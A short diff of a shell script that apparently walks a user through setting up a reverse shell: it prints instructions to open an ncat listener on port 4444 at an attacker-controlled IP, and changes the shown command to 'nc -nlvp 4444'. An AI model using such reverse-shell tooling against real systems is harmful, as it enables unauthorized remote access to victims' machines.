@@ -8,7 +8,7 @@ end=$'\e[0m'
 echo "======================="
 echo "STEP 1: On the IP you control (${ATTACKER_IP}), establish a listening ncat server by typing:"
 echo ""
-echo "${grn}nc -lvp 4444${end}"
+echo "${grn}nc -nlvp 4444${end}"
 echo ""
 echo "Replace ${ATTACKER_IP} with an IP you control, and can allow inbound access to on port 4444"
 echo ""
